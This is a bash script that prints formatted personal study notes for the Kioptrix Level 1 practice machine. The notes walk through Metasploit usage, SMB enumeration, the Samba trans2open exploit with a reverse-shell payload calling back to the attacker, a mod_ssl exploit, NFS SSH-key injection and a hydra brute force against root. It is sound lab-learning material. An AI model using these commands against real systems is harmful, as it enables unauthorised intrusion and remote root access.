#!/bin/bash
# bash notes.sh

R='\033[0m'
BOLD='\033[1m'
ITALIC='\033[3m'

WHITE='\033[38;5;255m'
GRAY='\033[38;5;245m'
MUTED='\033[38;5;238m'

RED='\033[38;5;203m'
ORANGE='\033[38;5;215m'
YELLOW='\033[38;5;228m'
GREEN='\033[38;5;114m'
CYAN='\033[38;5;81m'
BLUE='\033[38;5;69m'
PINK='\033[38;5;213m'
PURPLE='\033[38;5;141m'

BG_CODE='\033[48;5;234m'
BG_RED='\033[48;5;52m'
BG_BLUE='\033[48;5;17m'
BG_GREEN='\033[48;5;22m'
BG_YELLOW='\033[48;5;58m'
BG_PURPLE='\033[48;5;54m'

# ── helpers ──────────────────────────────────────────────────────

gap()  { echo ""; }

# H1 — page title
h1() {
  echo ""
  echo -e "  ${WHITE}${BOLD}$1${R}"
  echo -e "  ${MUTED}$(printf '%.0s─' {1..58})${R}"
  echo ""
}

# H2 — section title
h2() {
  echo ""
  echo -e "  ${CYAN}${BOLD}# $1${R}"
  echo ""
}

# H3 — subsection
h3() {
  echo -e "  ${PURPLE}${BOLD}## $1${R}"
  echo ""
}

# plain paragraph text
p() {
  echo -e "  ${GRAY}$1${R}"
}

# bold inline in a paragraph
# (just use ${WHITE}${BOLD}word${R}${GRAY} inline)

# ── callout blocks (Notion style — colored left border) ──────────

# 📘 blue info callout
info() {
  echo ""
  echo -e "  ${BLUE}▌${R}${BG_BLUE}  ${CYAN}${BOLD}$1${R}"
  shift
  for line in "$@"; do
    echo -e "  ${BLUE}▌${R}${BG_BLUE}  ${WHITE}${line}${R}"
  done
  echo -e "  ${BLUE}▌${R}"
  echo ""
}

# ⚠️  yellow warning callout
warn() {
  echo ""
  echo -e "  ${YELLOW}▌${R}${BG_YELLOW}  ${YELLOW}${BOLD}$1${R}"
  shift
  for line in "$@"; do
    echo -e "  ${YELLOW}▌${R}${BG_YELLOW}  ${WHITE}${line}${R}"
  done
  echo -e "  ${YELLOW}▌${R}"
  echo ""
}

# ✅ green tip callout
tip() {
  echo ""
  echo -e "  ${GREEN}▌${R}${BG_GREEN}  ${GREEN}${BOLD}$1${R}"
  shift
  for line in "$@"; do
    echo -e "  ${GREEN}▌${R}${BG_GREEN}  ${WHITE}${line}${R}"
  done
  echo -e "  ${GREEN}▌${R}"
  echo ""
}

# 🔴 red danger callout
danger() {
  echo ""
  echo -e "  ${RED}▌${R}${BG_RED}  ${RED}${BOLD}$1${R}"
  shift
  for line in "$@"; do
    echo -e "  ${RED}▌${R}${BG_RED}  ${WHITE}${line}${R}"
  done
  echo -e "  ${RED}▌${R}"
  echo ""
}

# 🟣 purple note callout
note() {
  echo ""
  echo -e "  ${PURPLE}▌${R}${BG_PURPLE}  ${PURPLE}${BOLD}$1${R}"
  shift
  for line in "$@"; do
    echo -e "  ${PURPLE}▌${R}${BG_PURPLE}  ${WHITE}${line}${R}"
  done
  echo -e "  ${PURPLE}▌${R}"
  echo ""
}

# bullet point
li() {
  echo -e "  ${MUTED}•${R}  ${GRAY}$1${R}"
}

# code block — dark bg, green prompt, cyan command
code() {
  echo -e "  ${BG_CODE}  ${GREEN}❯${R}${BG_CODE} ${CYAN}$1${R}"
}

# msf prompt line
msf() {
  echo -e "  ${BG_CODE}  ${PINK}msf6 >${R}${BG_CODE} ${CYAN}$1${R}"
}

# label above a code block
label() {
  echo -e "  ${MUTED}${ITALIC}$1${R}"
}

divider() {
  echo ""
  echo -e "  ${MUTED}$(printf '%.0s·' {1..58})${R}"
  echo ""
}

# ════════════════════════════════════════════════════════════════
clear

echo ""
echo -e "  ${MUTED}hack_project / kioptrix${R}"
h1 "Kioptrix Level 1 — Study Notes"
echo -e "  ${MUTED}Target: ${CYAN}192.168.1.184${MUTED}   Host: ${CYAN}KIOPTRIX${MUTED}   OS: ${CYAN}Linux 2.4.x RedHat${R}"
echo ""


# ════════════════════════════════════════════════════════════════
h2 "01 — msfconsole"
# ════════════════════════════════════════════════════════════════

p "Metasploit is the most widely used penetration testing framework."
p "${WHITE}${BOLD}msfconsole${R}${GRAY} is its interactive shell. You load a module, configure"
p "a target, and execute the exploit — all from one place."

gap

h3 "Module types"

li "${WHITE}exploit/${R}${GRAY}    — attacks a vulnerability to get code execution"
li "${WHITE}auxiliary/${R}${GRAY}  — scanners, fuzzers, sniffers (no payload needed)"
li "${WHITE}payload/${R}${GRAY}    — the code that runs on the target after exploitation"
li "${WHITE}post/${R}${GRAY}       — post-exploitation, runs after you have a shell"
li "${WHITE}encoder/${R}${GRAY}    — wraps payloads to try and bypass antivirus"

divider
h3 "Workflow — same steps every time"

p "Step 1 · Launch"
gap
code "msfconsole"
gap

p "Step 2 · Find a module"
gap
code "search mod_ssl"
code "search trans2open"
gap

p "Step 3 · Load it"
gap
code "use exploit/linux/samba/trans2open"
gap

p "Step 4 · See what options are required"
gap
code "show options"
gap

p "Step 5 · Set the options"
gap
code "set RHOSTS 192.168.1.184"
echo -e "  ${MUTED}         target IP${R}"
gap
code "set PAYLOAD linux/x86/shell_reverse_tcp"
echo -e "  ${MUTED}         what runs on the target after exploitation${R}"
gap
code "set LHOST 192.168.1.X"
echo -e "  ${MUTED}         your Kali IP — the shell calls back to this${R}"
gap

p "Step 6 · Run it"
gap
code "run"
gap

p "Step 7 · Manage shells"
gap
code "sessions -l"
echo -e "  ${MUTED}         list all open sessions${R}"
code "sessions -i 1"
echo -e "  ${MUTED}         jump into session 1${R}"

tip "💡 Tip" "Find your LHOST quickly with:  ip a | grep 192"


# ════════════════════════════════════════════════════════════════
h2 "02 — SMB / Samba"
# ════════════════════════════════════════════════════════════════

p "SMB (Server Message Block) is a protocol for sharing files and"
p "printers over a local network. On Linux it runs as ${WHITE}${BOLD}Samba${R}${GRAY}."
p "It listens on port ${WHITE}139${R}${GRAY} (NetBIOS) or port ${WHITE}445${R}${GRAY} (modern direct)."

divider
h3 "What the nmap scan shows us"

info "📄 nmap output — port 139" \
  "139/tcp  open  netbios-ssn  Samba smbd (workgroup: JMYGROUP)" \
  "nbstat:    NetBIOS name: KIOPTRIX" \
  "smb2-time: Protocol negotiation failed (SMB2)"

p "Breaking it down:"
gap
li "${WHITE}139/tcp open${R}${GRAY}          → SMB is running and accepting connections"
li "${WHITE}NetBIOS name: KIOPTRIX${R}${GRAY} → hostname leaked, useful for targeting"
li "${WHITE}SMB2 negotiation failed${R}${GRAY} → running ancient SMB1 / Samba 2.x"
li "${WHITE}workgroup: JMYGROUP${R}${GRAY}    → old setup confirmed, useful for enum4linux"

warn "⚠️  Warning" \
  "Port 445 is NOT open. SMB is only available on port 139." \
  "Some tools default to 445 — you may need to pass  -p 139  manually."

divider
h3 "Why old Samba is dangerous"

danger "CVE-2003-0201 — trans2open" \
  "Buffer overflow in Samba < 2.2.8." \
  "Gives unauthenticated remote root — no credentials needed at all."

note "Null sessions" \
  "Old Samba allows anonymous login by default." \
  "Anyone can list users, shares, and OS info without a password."

note "Username enumeration" \
  "Samba reveals whether a username is valid on a failed login." \
  "Makes brute-forcing easier — confirm real usernames first."

divider
h3 "Step 1 — enumerate SMB"

label "list shares anonymously:"
code "smbclient -L //192.168.1.184 -N"
echo -e "  ${MUTED}   -N means no password (anonymous)${R}"
gap

label "full enumeration — users, shares, OS, password policy:"
code "enum4linux -a 192.168.1.184"
gap

label "query the NetBIOS name table:"
code "nmblookup -A 192.168.1.184"
gap

label "map shares and their read/write permissions:"
code "smbmap -H 192.168.1.184"

divider
h3 "Step 2 — confirm Samba version"

label "inside msfconsole:"
msf "use auxiliary/scanner/smb/smb_version"
msf "set RHOSTS 192.168.1.184"
msf "run"
gap
p "The output prints the exact Samba version number."
p "If it is below ${WHITE}${BOLD}2.2.8${R}${GRAY} — go to Step 3."

divider
h3 "Step 3 — exploit with trans2open"

msf "use exploit/linux/samba/trans2open"
msf "set RHOSTS 192.168.1.184"
msf "set PAYLOAD linux/x86/shell_reverse_tcp"
msf "set LHOST <your-kali-ip>"
msf "run"

tip "💡 Tip" \
  "trans2open sometimes needs 2-3 attempts before the shell connects." \
  "If it exits cleanly with no session — just run it again."


# ════════════════════════════════════════════════════════════════
h2 "03 — Attack Priority"
# ════════════════════════════════════════════════════════════════

p "Based on the nmap scan, here is what to try and in what order:"
echo ""

echo -e "  ${RED}${BOLD}#1  mod_ssl / OpenFuck${R}  ${MUTED}→  port 443${R}"
gap
li "CVE-2002-0082"
li "Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b"
li "Remote buffer overflow → direct root shell, no login needed"
li "searchsploit mod_ssl  or  msfconsole"
gap

echo -e "  ${ORANGE}${BOLD}#2  Samba trans2open${R}  ${MUTED}→  port 139${R}"
gap
li "CVE-2003-0201"
li "Samba smbd, SMB1 only (workgroup JMYGROUP)"
li "Unauthenticated remote root"
li "use exploit/linux/samba/trans2open"
gap

echo -e "  ${YELLOW}${BOLD}#3  RPC / NFS recon${R}  ${MUTED}→  port 111 / 32768${R}"
gap
li "Check for exposed NFS shares"
code "rpcinfo -p 192.168.1.184"
code "showmount -e 192.168.1.184"
li "If shares are writable → inject SSH keys → shell"
gap

echo -e "  ${GRAY}${BOLD}#4  SSH brute force${R}  ${MUTED}→  port 22${R}"
gap
li "OpenSSH 2.9p2, SSHv1 supported — very old"
li "Last resort, slow"
code "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.184"

echo ""
echo -e "  ${MUTED}$(printf '%.0s─' {1..58})${R}"
echo -e "  ${MUTED}notes.sh  ·  target 192.168.1.184  ·  kioptrix level 1${R}"
echo ""
